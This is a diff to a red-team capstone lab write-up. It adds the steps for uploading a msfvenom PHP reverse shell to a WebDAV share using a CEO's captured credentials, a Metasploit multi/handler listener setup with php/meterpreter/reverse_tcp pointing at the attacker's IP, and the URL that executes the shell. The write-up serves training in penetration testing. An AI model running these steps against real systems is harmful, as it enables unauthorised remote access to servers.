@@ -67,6 +67,7 @@ The assessment uncovered the following critical vulnerabiliies in the target:
 - The next exploit was discovered in a file within the secret folder called "connect_to_corp_server". 
 - This file contained the hash of the CEO’s (Ryan) password and instructions on how to access another hidden directory within the server called “webdav”. 
 - The contents are displayed below: 
+  - Note the network file share address is incorrect here. It should include the IP of our victim machine i.e. dav://192.168.1.105/webdav/  
 
 ![webDavInstructions](https://github.com/keeslonkf/Red-Team-vs.-Blue-Team/blob/39d081ca13b751d97885985216948dfe3114aa54/RedTeam_Images/webDavInstructions.JPG) 
 
@@ -82,19 +83,41 @@ The assessment uncovered the following critical vulnerabiliies in the target:
 
 - Next, a payload was constructed using msfvenom to create the reverse shell php script to be exploited on the target. 
 
-![msfvenomPayload](https://github.com/keeslonkf/Red-Team-vs.-Blue-Team/blob/39d081ca13b751d97885985216948dfe3114aa54/RedTeam_Images/msfvenomPayload.JPG) 
+![msfvenomPayload]() 
 
 - With the high-level access acquired from Ryan's credentials, a php script was uploaded to the web server to initiate the first step in establishing a reverse shell between the Capstone Server and the Kali attacking machine. 
+- This is exploitation of the web misconfiguration
+
+> - Click Folder at top of desktop, Click in search bar and type in network file share folder
+> - dav://192.168.1.105/webdav/ , then enter ryan's credentials
+> - Drag and drop reverse_shell.php file into network file share 
+
 - The ability to upload a .php script is a web misconfiguration vulnerability that was exploited. 
 - A general coding best practice is to never allow uploading to a web server unless that is apart of the web application's functionality to the client. 
 - If uploading is necessary, uploaded data should undergo scrutiny before being allowed on the web server to ensure the data does not contain malware. 
 
-![uploadShellScript](https://github.com/keeslonkf/Red-Team-vs.-Blue-Team/blob/39d081ca13b751d97885985216948dfe3114aa54/RedTeam_Images/UploadShellScript.jpg)
+![uploadShellScript]()
 
 - Finally, a Local File Inclusion (LFI) vulnerability in the web server ensured the success of the reverse shell exploit. 
 - Local File Inclusion vulnerabilities work by allowing an uploaded file or script to be executed on the server. 
 - In this case, once the code is executed, it sends a meterpreter shell directly back to the attacking machine. 
-- This was accomplished using Metasploit in conjunction with the php script using the parameters below. 
+- This was accomplished using Metasploit to turn on a listening port waiting for us to execute the newly uploaded php script on the target machine
+> - msfconsole
+> - use exploit/multi/handler
+> - set payload php/meterpreter/reverse_tcp
+> - set lhost 192.168.1.90
+> - set lport 80
+> - show options
+> - exploit
+
+- This code forces the target machine to send us a meterpreter shell connection. 
+
+![msfsetup]()
+
+- Now we execute the script on the victim machine by typing the file path in the folder explorer search bar
+> - dav://192.168.1.105/webdav/reverse_shell.php 
+
+
 
 ![meterpreterShell](https://github.com/keeslonkf/Red-Team-vs.-Blue-Team/blob/39d081ca13b751d97885985216948dfe3114aa54/RedTeam_Images/meterpreterShell.JPG) 
 
